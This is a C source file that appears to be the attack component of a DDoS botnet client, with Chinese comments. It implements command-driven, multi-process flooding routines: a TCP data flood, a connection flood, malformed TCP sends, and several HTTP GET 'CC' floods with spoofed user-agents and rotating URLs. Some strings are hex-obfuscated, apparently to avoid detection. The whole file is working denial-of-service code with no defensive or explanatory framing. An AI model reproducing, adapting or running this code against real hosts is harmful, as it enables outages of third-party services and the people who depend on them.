#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <errno.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <netdb.h>

#include <unistd.h>

#include <signal.h>

//#include <pthread.h>



#include "common.h"

#include "attack.h"



#define MAX_PATH 512



typedef int SOCKET;



static int getrandom(int min, int max)

{

    if (min == max)

    {

        return min;

    }



    srand(time(NULL));

    int seed = rand() + 3;



    return seed % (max - min + 1) + min;

}



static int onerandom(int count)

{

    unsigned long now = (unsigned long)time(NULL);

    int seed = rand() + 3;



    return (seed * now) % count;

}



static unsigned long resolve(char *host)

{

    unsigned long i = 0;

    char ip[32];

    struct in_addr addr;



    if (!resolve_ip(host, ip))

        return 0;



    inet_aton(ip, &addr);



    return *(unsigned long *)&addr;

}



int tcpConnect(char *host, int port)

{

    int sock;



    sock = socket(AF_INET, SOCK_STREAM, 0);

    if(sock == -1)

        return sock;



    struct sockaddr_in sin;



    unsigned long ip = resolve(host);

    if(ip == 0)

        ip = inet_addr(host);



    sin.sin_addr.s_addr = ip;

    sin.sin_family = AF_INET;

    sin.sin_port = htons(port);



    if(connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)

    {

        close(sock);

        return -1;

    }



    return sock; 

}



// TCP Flood

static int TcpDataFlood(void *param)

{

	pid_t pid;

    COMMAND *cmd = (COMMAND *)param;

    int sockfd;

    struct sockaddr_in servaddr;

    char *buffer;





	pid = fork();

    if (pid > 0)

    {

        return pid; // 父进程返回

    }

    else if (pid < 0)

    {

        return -1;

    }



	

    if ((buffer = malloc(1024)) == NULL)

    {

        DEBUG(DEBUG_FATAL,"!! memory out\n");

        return -1;

    }



    memset(&servaddr, 0, sizeof(servaddr));

    servaddr.sin_family = AF_INET;

    servaddr.sin_addr.s_addr = resolve(cmd->target);

    servaddr.sin_port = htons(cmd->port);



    sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sockfd < 0)

    {

        DEBUG(DEBUG_FATAL,"!! create socket failed\n");

        free(buffer);

        return -1;

    }



    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)

    {

        DEBUG(DEBUG_FATAL,"!! connect server failed\n");

        free(buffer);

        close(sockfd);

        return -1;

    }



    memset(buffer, getrandom(0, 255), 1024);



    while (1)

    {

        send(sockfd, buffer, 1024, MSG_NOSIGNAL);

        usleep(1000 * cmd->delay);

    }



    free(buffer);

    close(sockfd);

    exit(0);;

}



// TCP并发

static int TcpMultiConnect(void *param)

{

    COMMAND *cmd = (COMMAND *)param;

    int sockfd;

    struct sockaddr_in servaddr;

	pid_t pid; 



	

	pid = fork();

	if (pid > 0)

	{

		return pid; // 父进程返回

	}

	else if (pid < 0)

	{

		return -1;

	}

	

    memset(&servaddr, 0, sizeof(servaddr));

    servaddr.sin_family = AF_INET;

    servaddr.sin_addr.s_addr = resolve(cmd->target);

    servaddr.sin_port = htons(cmd->port);



    while (1)

    {

        sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

        connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

        usleep(1000 * 10);

        close(sockfd);

    }



    exit(0);;

}



// TCP畸形连接

static int TcpCatFace(void *param)

{

    COMMAND *cmd = (COMMAND *)param;

    int sockfd;

    struct sockaddr_in servaddr;

    char *buffer;

	pid_t pid; 



	

	pid = fork();

	if (pid > 0)

	{

		return pid; // 父进程返回

	}

	else if (pid < 0)

	{

		return  -1;

	}

    if ((buffer = malloc(2048)) == NULL)

    {

        DEBUG(DEBUG_FATAL,"!! memory out\n");

        return -1;

    }



    memset(&servaddr, 0, sizeof(servaddr));

    servaddr.sin_family = AF_INET;

    servaddr.sin_addr.s_addr = resolve(cmd->target);

    servaddr.sin_port = htons(cmd->port);



    sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sockfd < 0)

    {

        DEBUG(DEBUG_FATAL,"!! create socket failed\n");

        free(buffer);

        return -1;

    }



    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)

    {

        DEBUG(DEBUG_FATAL,"!! connect server failed\n");

        free(buffer);

        close(sockfd);

        return -1;

    }



    memset(buffer, 'a' + onerandom(26), 1024 + onerandom(1024));



    while (1)

    {

        send(sockfd, buffer, 2048, MSG_NOSIGNAL);

        usleep(1000 * 10);

    }



    free(buffer);

    close(sockfd);

    exit(0);;

}



// Http Get协议

static int WebGetFull(void *param)

{

    COMMAND *cmd = (COMMAND *)param;

    char *ptr;

    char *tIP, *zIP, *ctsz, *strTrueDNS;

    char *url, *http, *rhost;

    int sockfd;

	pid_t pid; 



	

	pid = fork();

	if (pid > 0)

	{

		return pid; // 父进程返回

	}

	else if (pid < 0)

	{

		return  -1;

	}

    tIP = malloc(MAX_PATH);

    zIP = malloc(MAX_PATH);

    ctsz = malloc(MAX_PATH);

    strTrueDNS = malloc(MAX_PATH);

    url = malloc(MAX_PATH * 4);

    http = malloc(MAX_PATH);

    rhost = malloc(MAX_PATH);



    if (!tIP || !zIP || !ctsz || !strTrueDNS || !url || !http || !rhost)

    {

        DEBUG(DEBUG_FATAL,"!! memory out\n");

        goto cleanup;

    }



    memset(tIP, 0, MAX_PATH);

    memset(zIP, 0, MAX_PATH);

    memset(ctsz, 0, MAX_PATH);

    memset(strTrueDNS, 0, MAX_PATH);

    memset(url, 0, MAX_PATH * 4);

    memset(http, 0, MAX_PATH);

    memset(rhost, 0, MAX_PATH);



    strcpy(tIP, cmd->target + 7);

    strcpy(zIP, tIP);

    ptr = strchr(zIP, '/');

    if (ptr == NULL)

    {

        DEBUG(DEBUG_FATAL,"!! invalid target address\n");

        goto cleanup;

    }

    memset(ptr, 0, strlen(ptr));

    strcpy(tIP, strchr(tIP, '/') + 1);

    strcpy(ctsz, tIP);



    if (inet_addr(zIP) == INADDR_NONE)

    {

        char ip[32];



        if (resolve_ip(zIP, ip))

        {

            strcpy(strTrueDNS, ip);

        }

        else

        {

            strcpy(strTrueDNS, zIP);

        }

    }

    else

    {

        strcpy(strTrueDNS, zIP);

    }



    strcpy(http, zIP);

    strcpy(rhost, http);

    strcpy(url, "GET ");

    strcat(url, ctsz);

    strcat(url, " HTTP/1.1\r\n");

    strcat(url, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\n");

    strcat(url, "Accept-Language: zh-cn\r\n");

    strcat(url, "Accept-Encoding: gzip, deflate");

    strcat(url, "\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");

    strcat(url, "\r\nHost:");

    strcat(url, rhost);

    strcat(url, "\r\nConnection: Keep-Alive");

    strcat(url, "\r\n\r\n");



    while (1)

    {

        int S=tcpConnect(strTrueDNS,cmd->port);

        send(S,url,strlen(url) ,MSG_NOSIGNAL);

        close(S);

        usleep(1000*cmd->delay);

    }



cleanup:

    if (tIP) free(tIP);

    if (zIP) free(zIP);

    if (ctsz) free(ctsz);

    if (strTrueDNS) free(strTrueDNS);

    if (url) free(url);

    if (http) free(http);

    if (rhost) free(rhost);

    exit(0);;

}



// 变异CC压力测试

static int WebCCAttack(void *param)

{

    COMMAND *cmd = (COMMAND *)param;

    char ip[32],url[64],*point=NULL;

	pid_t pid; 



	

	pid = fork();

	if (pid > 0)

	{

		return pid; // 父进程返回

	}

	else if (pid < 0)

	{

		return  -1;

	}

	point=cmd->target;

    //http://

    char strHttp[]={0x68,  0x74,  0x74,  0x70,  0x3A,  0x2F,  0x2F,  0x00};

    if(strstr(cmd->target,strHttp)!=NULL)

    {

        point=point+strlen(strHttp);

    }

    if(strstr(point,"/")!=NULL)

    {

        memset(ip,0,sizeof(ip));

        strncpy(ip,point,strcspn(point,"/"));

        point=point+strcspn(point,"/");

        memset(url,0,sizeof(url));

        strcpy(url,point);

    }



    if (strlen(url)<2)

    {

        strcpy(url,"/");

    }



    struct sockaddr_in sockAddr;

    SOCKET  m_hSocket;



    memset(&sockAddr,0,sizeof(sockAddr));

    sockAddr.sin_family = AF_INET;

    sockAddr.sin_port=htons(cmd->port);

    sockAddr.sin_addr.s_addr=resolve(ip); 



    char header[MAX_PATH] = ""; 

    //Connection: Close

    char strConnection[]={0x43,  0x6F,  0x6E,  0x6E,  0x65,  0x63,  0x74,  0x69,  0x6F,  0x6E,  0x3A,  0x20,  0x43,  0x6C,  0x6F,  0x73,  0x65,  0x00};

    //Mozilla/5.0

    char strMozilla[]={0x4D,  0x6F,  0x7A,  0x69,  0x6C,  0x6C,  0x61,  0x2F,  0x35,  0x2E,  0x30,  0x00};

    //Host:

    char strHost[]={0x48,  0x6F,  0x73,  0x74,  0x3A,  0x00};

    //Connection:

    char strCon[]={0x43,  0x6F,  0x6E,  0x6E,  0x65,  0x63,  0x74,  0x69,  0x6F,  0x6E,  0x3A,  0x00};

    if (cmd->port == 80 )

    {

        sprintf(header,

            "GET %s HTTP/1.1\r\n"

            "%s %s\r\n"

            "User-Agent: %s (Windows; U; Windows NT 5.1; zh-CN; rv:**.**.**.**) Gecko/2009101601 Firefox/3.0.15"

            "Cache-Control: no-store, must-revalidate\r\n"

            "Referer: %s%s\r\n"

            "%s keep-alive\r\n\r\n",

            url,

            strHost,

            ip,

            strMozilla,

            strHttp,

            ip,strCon);

    }

    else

    {

        sprintf(header, 

            "GET %s HTTP/1.1\r\n"

            "%s %s:%d\r\n"

            "User-Agent: %s (Windows; U; Windows NT 5.1; zh-CN; rv:**.**.**.**) Gecko/2009101601 Firefox/3.0.15"

            "Cache-Control: no-store, must-revalidate\r\n"

            "Referer: //%s\r\n"

            "%s\r\n\r\n",

            url,

            strHost,

            ip,

            cmd->port,

            strMozilla,

            strHttp,

            ip,strConnection);

    }



    while(1)

    {

        m_hSocket =socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        connect(m_hSocket,(struct sockaddr *)&sockAddr,sizeof(struct sockaddr_in)); 

        send(m_hSocket, header, strlen(header), MSG_NOSIGNAL);

        close(m_hSocket); 



        usleep(1000*cmd->delay);

    }



    exit(0);;

}



// 无限CC压力测试

static int WebInfinitudeCC(void *param)

{

    COMMAND *cmd = (COMMAND *)param;

    char *url, *http, *rhost;

    char *FuckIP = cmd->target;

    int FuckPort = cmd->port;

	pid_t pid; 



	

	pid = fork();

	if (pid > 0)

	{

		return pid; // 父进程返回

	}

	else if (pid < 0)

	{

		return -1;

	}

    url = malloc(MAX_PATH * 4);

    http = malloc(MAX_PATH);

    rhost = malloc(MAX_PATH);



    if (!url || !http || !rhost)

    {

        DEBUG(DEBUG_FATAL,"!! memory out\n");

        goto cleanup;

    }



    memset(url, 0, MAX_PATH*4);

    memset(http, 0,MAX_PATH);

    memset(rhost, 0,MAX_PATH);

    strcpy(http,FuckIP);

    strcpy(rhost,http);

    //char *jj = "/";

    char jj[2] = {'/', '\0'};



    strcpy(url,"GET ");

    strcat(url,jj);

    strcat(url," HTTP/1.1\r\n");

    strcat(url,"Content-Type: text/html");

    strcat(url,"\r\nHost: ");

    strcat(url,rhost);

    strcat(url,"\r\nAccept: text/html, */*");

    strcat(url,"\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.0; MyIE 3.01)");

    strcat(url,"\r\n\r\n");;



    while (1)

    {

        SOCKET S=tcpConnect(FuckIP,FuckPort);

        send(S,url,strlen(url) ,MSG_NOSIGNAL);

        //close(S);

        usleep(1000*cmd->delay);

    }



cleanup:

    if (url) free(url);

    if (http) free(http);

    if (rhost) free(rhost);



	exit(0);

}



// 分布循环式CC

static int WebSpiderCC(void *param)

{

    COMMAND *cmd = (COMMAND *)param;

    char ip[32],url[100],*point=NULL, *FuckIP=cmd->target;

    point=FuckIP;

    int FuckPort = cmd->port;

    int iBenginParam = cmd->var1;

    int iEndParam = cmd->var2;

	pid_t pid; 



	

	pid = fork();

	if (pid > 0)

	{

		return pid; // 父进程返回

	}

	else if (pid < 0)

	{

		return -11;

	}

    //http://

    char strHttp[]={0x68,  0x74,  0x74,  0x70,  0x3A,  0x2F,  0x2F,  0x00};

    if(strstr(FuckIP,strHttp)!=NULL)

    {

        point=point+strlen(strHttp);

    }

    if(strstr(point,"/")!=NULL)

    {

        memset(ip,0,sizeof(ip));

        strncpy(ip,point,strcspn(point,"/"));

        point=point+strcspn(point,"/");

        memset(url,0,sizeof(url));

        strcpy(url,point);

    }



    if (strlen(url)<2)

    {

        strcpy(url,"/");

    }



    struct sockaddr_in sockAddr;

    SOCKET  m_hSocket;



    memset(&sockAddr,0,sizeof(sockAddr));

    sockAddr.sin_family = AF_INET;

    sockAddr.sin_port=htons(FuckPort);

    sockAddr.sin_addr.s_addr=resolve(ip); 



    char header[MAX_PATH] = ""; 

    char szUrlchg[100];

    int  iParam = iBenginParam;

    //Connection: Close

    char strConnection[]={0x43,  0x6F,  0x6E,  0x6E,  0x65,  0x63,  0x74,  0x69,  0x6F,  0x6E,  0x3A,  0x20,  0x43,  0x6C,  0x6F,  0x73,  0x65,  0x00};

    //Mozilla/5.0

    char strMozilla[]={0x4D,  0x6F,  0x7A,  0x69,  0x6C,  0x6C,  0x61,  0x2F,  0x35,  0x2E,  0x30,  0x00};

    //Host:

    char strHost[]={0x48,  0x6F,  0x73,  0x74,  0x3A,  0x00};

    while(1)

    {

        sprintf(szUrlchg,url,iParam);

        iParam++;

        if(iParam > iEndParam)

            iParam = iBenginParam;



        if (FuckPort == 80 )

        {

            sprintf(header,

                "GET %s HTTP/1.1\r\n"

                "%s %s\r\n"

                "Cache-Control: no-store, must-revalidate\r\n"

                "Referer: %s%s\r\n"

                "%s\r\n\r\n",

                szUrlchg,

                strHost,

                strHttp,

                ip,

                ip,strConnection);

        }

        else

        {

            sprintf(header, 

                "GET %s HTTP/1.1\r\n"

                "%s %s:%d\r\n"

                "User-Agent: %s (Windows; U; Windows NT 5.1; zh-CN; rv:**.**.**.**) Gecko/2009101601 Firefox/3.0.15"

                "Cache-Control: no-store, must-revalidate\r\n"

                "Referer: %s%s\r\n"

                "%s\r\n\r\n",

                szUrlchg,

                strHost,

                ip,

                FuckPort,strMozilla,strHttp,

                ip,strConnection);

        }



        m_hSocket =socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        connect(m_hSocket,(struct sockaddr *)&sockAddr,sizeof(struct sockaddr_in)); 

        send(m_hSocket, header, strlen(header), MSG_NOSIGNAL);

        close(m_hSocket); 



        usleep(1000*cmd->delay);

    }



    exit(0);;

}



void start_attack(COMMAND *cmd, int *pid, int *pid_cnt)

{ 

    //pthread_t pt;

    int i;

	int ret = -1;



	pid = malloc(sizeof(int) * cmd->thread);

	if(pid == NULL)

	{

		DEBUG(DEBUG_FATAL, "malloc is error\n");

		return;

	}

	*pid_cnt = cmd->thread;

		



    switch (cmd->type)

    {

    case CMD_TCP_FLOOD:

        DEBUG(DEBUG_FATAL,"start %d threads TcpDataFlood attack\n", cmd->thread);



        for (i = 0; i < cmd->thread; i++)

        {

            //pthread_create(&pt, NULL, TcpDataFlood, cmd);

           

			ret = TcpDataFlood(cmd);

			if(ret >= 0)

			{

				 pid[i] = ret;

			}

		}

        break;

    case CMD_TCP_MULTI_CONNECT:

        DEBUG(DEBUG_FATAL,"start %d threads TcpMultiConnect attack\n", cmd->thread);

        for (i = 0; i < cmd->thread; i++)

        {

            //pthread_create(&pt, NULL, TcpMultiConnect, cmd);

			ret = TcpMultiConnect(cmd);



			if(ret >= 0)

			{

				 pid[i] = ret;

			}

		}

        break;

    case CMD_TCP_CAT_FACE:

        DEBUG(DEBUG_FATAL,"start %d threads TcpCatFace attack\n", cmd->thread);

        for (i = 0; i < cmd->thread; i++)

        {

            //pthread_create(&pt, NULL, TcpCatFace, cmd);

			ret = TcpCatFace(cmd);



			if(ret >= 0)

			{

				 pid[i] = ret;

			}

		}

        break;

    case CMD_WEB_GET_FULL:

        DEBUG(DEBUG_FATAL,"start %d threads WebGetFull attack\n", cmd->thread);

        for (i = 0; i < cmd->thread; i++)

        {

            //pthread_create(&pt, NULL, WebGetFull, cmd);

			ret = WebGetFull(cmd);



			if(ret >= 0)

			{

				 pid[i] = ret;

			}

		}

        break;

    case CMD_WEB_CAT_FACE:

        DEBUG(DEBUG_FATAL,"start %d threads WebCCAttack attack\n", cmd->thread);

        for (i = 0; i < cmd->thread; i++)

        {

            //pthread_create(&pt, NULL, WebCCAttack, cmd);

			ret = WebCCAttack(cmd);



			if(ret >= 0)

			{

				 pid[i] = ret;

			}

		}

        break;

    case CMD_WEB_INFINITUDE:

        DEBUG(DEBUG_FATAL,"start %d threads WebInfinitudeCC attack\n", cmd->thread);

        for (i = 0; i < cmd->thread; i++)

        {

            //pthread_create(&pt, NULL, WebInfinitudeCC, cmd);

			ret = WebInfinitudeCC(cmd);



			if(ret >= 0)

			{

				 pid[i] = ret;

			}

		}

        break;

    case CMD_WEB_SPIDER:

        DEBUG(DEBUG_FATAL,"start %d threads WebSpiderCC attack\n", cmd->thread);

        for (i = 0; i < cmd->thread; i++)

        {

            //pthread_create(&pt, NULL, WebSpiderCC, cmd);

			ret = WebSpiderCC(cmd);



			if(ret >= 0)

			{

				 pid[i] = ret;

			}

		}

        break;

    default:

        DEBUG(DEBUG_FATAL,"unsupported attack command!\n");

        break;

    }

}



void stop_attack(int *pid, int pid_cnt)

{

	int i = 0;



	for(i = 0; i < pid_cnt; i++)

	{

		 kill(pid[i], SIGKILL);

	}



}
